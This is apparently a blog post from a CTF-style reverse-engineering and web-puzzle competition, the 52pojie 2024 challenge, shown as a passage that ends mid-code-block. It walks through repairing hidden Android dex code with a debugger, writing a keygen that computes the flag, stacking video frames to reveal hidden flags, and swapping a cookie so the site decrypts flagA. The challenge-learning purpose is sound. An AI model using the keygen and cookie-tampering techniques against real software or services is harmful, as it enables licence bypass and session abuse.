68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">B</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br />}</code></pre><p>看来这个B.d还是坏的，还得修复一次</p><h4>修复3</h4><p>原先程序里的那个fix函数只能修复A.d部分，接下来修复B.d</p><p>回到MainActivity，还是定位到这句</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s1</span> = (String)<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">DexClassLoader</span>(file0.getAbsolutePath(), file1.getAbsolutePath(), <span style="color: rgb(198, 197, 254);">null</span>, classLoader0).loadClass(<span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.C"</span>).getDeclaredMethod(<span style="color: rgb(168, 255, 96);">"isValidate"</span>, Context.class, String.class, <span style="color: rgb(255, 255, 182);">int</span>[].class).invoke(<span style="color: rgb(198, 197, 254);">null</span>, this, s, this.getResources().getIntArray(array.A_offset));</code></pre><p>语句中出现了A_offset，说明是修复A类型的，定位到array.A_offset这个变量</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">array</span> {<br />        <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">A_offset</span> = <span style="color: rgb(255, 115, 253);">0x7F030000</span>;  <span style="color: rgb(124, 124, 124);">// array:A_offset</span><br />        <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">B_offset</span> = <span style="color: rgb(255, 115, 253);">0x7F030001</span>;  <span style="color: rgb(124, 124, 124);">// array:B_offset</span><br /><br />    }</code></pre><p>（诶，A_offset下面那个B_offset是啥？这不是我们要找的“B类”的偏移嘛，这下不用手算了）</p><p>直接jeb跑起来，在A_offeset处下断点，把A_offset的值换成B_offset</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">000000E4  sget                v3, R$array-&gt;A_offset:I  <span style="color: rgb(124, 124, 124);">#此处下断点，修改Locals中v3的值为B_offset，即将其改为7F30001h，如图</span><br />000000E8  invoke-virtual      Resources-&gt;getIntArray(I)[I, p1, v3</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a1cda62e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKOuKDGoYwJKETq2ecpZc85neAibPd4PXCic4ZshiaXmT4Gn4bWRLMqBwHg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>运行程序，断点至本文"修复2"部分提及的删除函数，得到B.d修复后的<code style="font-family: SFMono-Regular, Consolas, ;">2_new.dex</code>（此处为了避免与上部分中2.dex混淆，将其命名为2_new.dex，实际由程序生成的文件名仍为2.dex）</p><p>打开2_new.dex，反编译得到其中的B类，定位至B.d</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">B</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"机缘是{"</span> + Utils.md5(Utils.getSha1(<span style="color: rgb(168, 255, 96);">"password+你的uid"</span>.getBytes())) + <span style="color: rgb(168, 255, 96);">"}"</span>;<br />    }<br />}</code></pre><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag："{" + Utils.md5(Utils.getSha1("password+你的uid".getBytes())) + "}"</span><br />其中的password上面已经提到了，是"048531267"</p></blockquote><p>到此，这个CM终于完事了</p><p><span style="font-weight: 700;">此处特别感谢 正己 佬提供的题目以及指点</span></p><h3>附——Utils中的两个算法（由smali代码反编译得到，无法直接运行）：</h3><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">byte</span>[] getSha1(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"SHA"</span>).digest(arr_b);<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">md5</span>(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(255, 255, 182);">int</span> v;<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">BigInteger</span>(<span style="color: rgb(255, 115, 253);">1</span>, MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"md5"</span>).digest(arr_b)).toString(<span style="color: rgb(255, 115, 253);">16</span>);<br />            v = <span style="color: rgb(255, 115, 253);">0</span>;<br />            <span style="color: rgb(150, 203, 254);">while</span>(<span style="color: rgb(198, 197, 254);">true</span>) {<br />            label_2:<br />                <span style="color: rgb(150, 203, 254);">if</span>(v &gt;= <span style="color: rgb(255, 115, 253);">0x20</span> - s.length()) {<br />                    <span style="color: rgb(150, 203, 254);">return</span> s;<br />                }<br /><br />                s = <span style="color: rgb(168, 255, 96);">"0"</span> + s;<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            }<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(NoSuchAlgorithmException unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"ops!!"</span>);<br />        }<br /><br />        ++v;<br />        goto label_2;<br />    }</code></pre><h3>写个小程序计算一下flag（注册机）</h3><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> java.io.*;<br /><span style="color: rgb(150, 203, 254);">import</span> java.math.BigInteger;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.MessageDigest;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.NoSuchAlgorithmException;<br /><span style="color: rgb(150, 203, 254);">import</span> java.util.Scanner;<br /><br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">GetFlag</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">byte</span>[] getSha1(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"SHA"</span>).digest(arr_b);<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">md5</span>(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">BigInteger</span>(<span style="color: rgb(255, 115, 253);">1</span>, MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"md5"</span>).digest(arr_b)).toString(<span style="color: rgb(255, 115, 253);">16</span>);<br />            <span style="color: rgb(150, 203, 254);">return</span> s;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(NoSuchAlgorithmException unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"ops!!"</span>);<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">main</span>(String args[]) {<br />        <span style="color: rgb(150, 203, 254);">try</span> (<span style="color: rgb(255, 255, 182);">Scanner</span> <span style="color: rgb(198, 197, 254);">scanner</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Scanner</span>(System.in)) {<br />            System.out.println(<span style="color: rgb(168, 255, 96);">"Please Input Your UID："</span>);<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s</span> = <span style="color: rgb(168, 255, 96);">"048531267"</span> + scanner.next();<br />            System.out.println(<span style="color: rgb(168, 255, 96);">"Flag："</span> + <span style="color: rgb(168, 255, 96);">"{"</span> + GetFlag.md5(GetFlag.getSha1(s.getBytes())) + <span style="color: rgb(168, 255, 96);">"}"</span> );<br />        }<br />    }<br />}</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5ee3d817&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKvRc80Hib8jlf6nVQEptHxOg9OONPXc9Fe0h93GiaArqlibSvMKA8avJdQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>总结</h2><p>正如开头所说，这是我第一次参与红包活动，也是第一次接触安卓类的逆向<br />因文章篇幅所限，一些细节的内容（比如环境配置、设置apk为可调试等）不能详尽地涉及，如果有对以上部分有疑问和建议也欢迎各位在楼下交流讨论</p><p><span>总体而言这几道题目相对来说难度还行（主要还是我太菜了）</span></p><h3>前言</h3><p>好家伙，这下Web题越来越像猜灯谜了，而且还是眼睛有点酸的那种......<br />（说的就是flag1和3，愿称之为opencv独家赞助伙伴【bushi】）</p><h3>题目简介</h3><p>活动地址：https://www.52pojie.cn/thread-1889163-1-1.html<br />解题线索视频：https://www.bilibili.com/video/BV1ap421R7VS<br />题目共包含 12 个静态 flag: flag1~flag12，另外还需要寻找到 3 个动态 flag: flagA~flagC，每个难度需提交对应的4个静态flag和1个动态flag</p><h3>准备工作</h3><p>本次的视频隐藏的信息有点复杂，有两个flag都需要逐帧分析，因此我们先用ffmpeg工具把视频转换为图帧<br />（我没有阿B的大会员，下载的视频是30fps的，因此r的参数是30，若下载的是60fps的，只要调整以下命令中r的参数为60就行了）</p><p><code style="font-family: SFMono-Regular, Consolas, ;">ffmpeg -i inputfile.mp4 -r 30 ./images/%1d.jpg</code></p><p>得到一文件夹的图片：<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c40cc902&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKjE2dgxkPlO1ibavEcicScRsBXgnvdlPK9RpKe48GxR2yU4yiaFdKZpymg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>接下来就是处理那个切成了四段的二维码，<br />认真看的小伙伴应该已经发现了，这个二维码的几个帧拼在一起就是一个完整的二维码<br />使用修图软件框选太麻烦了，有的二维码部分甚至和文字的白色部分连在了一起，<br />既然我对cv领域比较熟悉，因此我还是用opencv叠加吧</p><p>下面是一个用python写的叠加小程序：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> cv2<br /><span style="color: rgb(150, 203, 254);">import</span> os<br /><br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">add_images_in_folder</span>(folder_path):<br />    <span style="color: rgb(124, 124, 124);"># Get a list of all files in the folder</span><br />    image_files = [f <span style="color: rgb(150, 203, 254);">for</span> f <span style="color: rgb(150, 203, 254);">in</span> os.listdir(folder_path) <span style="color: rgb(150, 203, 254);">if</span> f.endswith(<span style="color: rgb(168, 255, 96);">'.jpg'</span>)]<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> len(image_files) == <span style="color: rgb(255, 115, 253);">0</span>:<br />        print(<span style="color: rgb(168, 255, 96);">"No JPG images found in the folder."</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">None</span><br /><br />    <span style="color: rgb(124, 124, 124);"># Read the first image to initialize the accumulator</span><br />    result = cv2.imread(os.path.join(folder_path, image_files[<span style="color: rgb(255, 115, 253);">0</span>]))<br /><br />    <span style="color: rgb(124, 124, 124);"># Loop through the rest of the images and add them to the accumulator</span><br />    <span style="color: rgb(150, 203, 254);">for</span> image_file <span style="color: rgb(150, 203, 254);">in</span> image_files[<span style="color: rgb(255, 115, 253);">1</span>:]:<br />        image_path = os.path.join(folder_path, image_file)<br />        image = cv2.imread(image_path)<br />        result = cv2.add(result, image)<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> result<br /><br />folder_path = <span style="color: rgb(168, 255, 96);">"./images"</span><br />result_image = add_images_in_folder(folder_path)<br /><br /><span style="color: rgb(150, 203, 254);">if</span> result_image <span style="color: rgb(150, 203, 254);">is</span> <span style="color: rgb(150, 203, 254);">not</span> <span style="color: rgb(198, 197, 254);">None</span>:<br />    cv2.imwrite(<span style="color: rgb(168, 255, 96);">"./result.png"</span>,result_image)<br /></code></pre><p>手动处理去除文字部分，得到完整的二维码如图：<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=80fcc8ac&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKPvRF7OdHmCWnSUukic7iaBURVsiaCEZ0fK0rGct4qXqrAEp9H4rJmhpPg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>解码得到网址：https://2024challenge.52pojie.cn/</p><h3>Flag1</h3><p>视频中出现52pojie四个字的时候，后面点阵散开处点阵缺少了一些点，而这些缺少的点就隐藏了flag1，我们用准备部分提到的“叠加小程序”对此部分帧图片进行叠加，得到可见flag</p><p>（这个flag也可以直接看，就是有点费眼【doge】）<br />拼接结果：<img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=866918ec&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpibicJSic3mkX1sSDXHAVcvyI5skxWnfDeicIza1IEsDfMcgHrwKz9H6mg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag1{52pj2024}</span></p></blockquote><h3>Flag2</h3><p>参考去年的官方题解中flag2部分解释：</p><blockquote><p style="margin-bottom: 15px;">因为页面会自动重定向，我本来想将 X-Dynamic-Flag: flagA{Header X-52PoJie-Uid Not Found} 藏在这个重定向之前的页面的，但是我怕藏得太深了，没这么搞。</p></blockquote><p>今年的flag2果然藏在了重定向页面前......<br />访问上述二维码指向的的网页会产生重定向，打开F12打开控制台后重新访问该链接即可看到X-Flag2：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=39de93fa&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK1m7UcfRv20FnCRHibsa7LBIK87VpKonep9z8iaob5VJOjGl9w6sRCnxw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag2{xHOpRP}</span></p></blockquote><h3>Flag3</h3><p>视频开头那段东西就是，一看到就想到了这个视频，<br />二值杂色视觉暂留效应嘛，“二值杂色”+“视觉暂留”。<br />前者是指把一个复杂的图像，按照灰度不同去四舍五入为黑与白两种噪点。后者则意味着需要借助你眼睛与脑子的时间差，去串联起前后的噪点位置的变化，让你的脑子中形成轨迹图片。<br />这玩意常用在验证码上，用来过AI的，所以只能人工看了。</p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag3{GRsgk2}</span></p></blockquote><h3>Flag4</h3><p>打开上述提到的网址，F12，查看网络，会发现有一个文件名叫做<code style="font-family: SFMono-Regular, Consolas, ;">flag4_flag10.png</code>的空白图片作为背景（实际上是透明的，浏览器看不出而已）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">body</span> {<br />            <span style="color: rgb(255, 255, 182);">margin</span>: <span style="color: rgb(255, 115, 253);">0</span>;<br />            <span style="color: rgb(255, 255, 182);">padding</span>: <span style="color: rgb(255, 115, 253);">0</span>;<br />            <span style="color: rgb(255, 255, 182);">background</span>: url(<span style="color: rgb(168, 255, 96);">"flag4_flag10.png"</span>) white center center no-repeat;<br />            <span style="color: rgb(255, 255, 182);">background-size</span>: contain;<br />            <span style="color: rgb(255, 255, 182);">height</span>: <span style="color: rgb(255, 115, 253);">100vh</span>;<br />            <span style="color: rgb(255, 255, 182);">overflow</span>: hidden;<br />        }</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a5df2cc5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK4q5tlRiaNP5eMzpmfBvZLEKnNqjKWE3lrwrvcqsbRQzQicPIVzydz2zg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>下载下来使用图片应用打开即可看到flag4；<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c05177a2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKUsQqLRaD1sLZYibfmMtY8gMAuK1G4xgiak9StOIr60fzCBwtYL8MibnqQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag4{YvJZNS}</span></p></blockquote><h3>FlagA</h3><p>同样是开上述提到的网址，F12，查看网络，输入uid登录，会发现有一个叫做<code style="font-family: SFMono-Regular, Consolas, ;">login</code>的网页写入了cookie信息<br />而cookie信息中提到了flagA<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d49aa80c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK7iagntySrxR8wpl7PdnC0o3yaTRfJ48Fz8kjXsyfV39AKSD5bSjScFw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flagA=guFOgjwXg5haqETMpDMLPyHfY7sP5sf32rW7l3XtVr+9T+LyBKQhmslLNA==; expires=Sat, 17 Feb 2024 06:00:00 GMT; path=/; SameSite=Lax</code></p><p>看起来flagA被加密了，而且不是base64<br />但与此同时，uid好像也采用了类似的加密方式，而且网址里好像有个script API用来把cookie转换为uid（嗯？）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">        <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/auth/uid'</span>).<span style="color: rgb(255, 255, 182);">then</span>(res =&gt; res.<span style="color: rgb(255, 255, 182);">text</span>()).<span style="color: rgb(255, 255, 182);">then</span>(res =&gt; {<br />            <span style="color: rgb(150, 203, 254);">if</span> (res) {<br />                <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#uid'</span>).textContent = res;<br />                <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#logout-form'</span>).style.display = <span style="color: rgb(168, 255, 96);">''</span>;<br />                <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#login-form'</span>).style.display = <span style="color: rgb(168, 255, 96);">'none'</span>;<br />            }<br />        });</code></pre><p>那么就好办了，我们来<span style="font-weight: 700;">偷梁换柱</span>一下，把cookie中的flagA设置到uid中，再fetch......<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6f2c6b27&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK3Pfj1ObJqTWLiap1YFy7Ft06TQfro4licYrDdOZpuvvLiaJEYEIFNjeiaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flagA{f96a1e5e}</span></p></blockquote><p><span style="font-weight: 700;">注：flagA每10分钟刷新</span></p><h3>Flag5</h3><p>还是那个网页，F12，网页里用注释提到了Flag5<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9f675c00&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpyptCNUyCesyxQn7gclH1ia3HwRRGnS0TjCOchRCeqODf0lhqOMZ1ww%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>我们把style中的属性全部去掉，得到以下一串东西（用图片了，直接发论坛MD渲染会崩）：<br /><span style="color: #000;"><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f47e9779&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKhQicpB93um2RDPFp4l4a4r0f5j0gTsDv0e2Vc2q7zDHQASePN8TyQtg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br /></span><br /><span style="color: #000000;"><br /></span><span style="color: #000;">我们暂且不管<code style="font-family: Consolas, Monaco, ;">. _ / \</code>那一堆符号（flag9的地方会说），剩下的就是flag5</span></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag5{P3prqF}</span></p></blockquote><h3>Flag6</h3><p>还是那个网页，下方有个flag6的按钮，点击进入flag6<br /><span style="color: #000000;">网页很干净，就一个按钮，点了就开始炼丹，电脑风扇呼呼响（doge）</span><br /><span style="color: #000000;"><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cc5c2a78&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK6jsQr6gF9XU9O6m9eEMbykp49H2rGs3lS57pv7NT3YaPxjyAvkJcrw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></span><br /><span style="color: #000000;"><br /></span><br /><span style="color: #000000;">还是来看看源码吧：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) 